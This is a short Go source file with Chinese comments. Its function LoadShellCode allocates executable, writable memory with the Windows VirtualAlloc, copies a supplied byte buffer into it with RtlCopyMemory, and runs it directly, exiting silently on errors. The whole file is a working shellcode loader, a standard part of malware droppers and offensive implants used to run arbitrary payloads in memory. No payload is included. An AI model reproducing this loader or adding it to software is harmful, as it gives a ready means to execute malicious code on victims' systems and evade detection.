package sub

import (
	"syscall"
	"unsafe"
)

const (
	MemCommit            = 0x1000
	MemReserve           = 0x2000
	PageExecuteReadwrite = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
)

var (
	//调用winApi
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func LoadShellCode(b []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
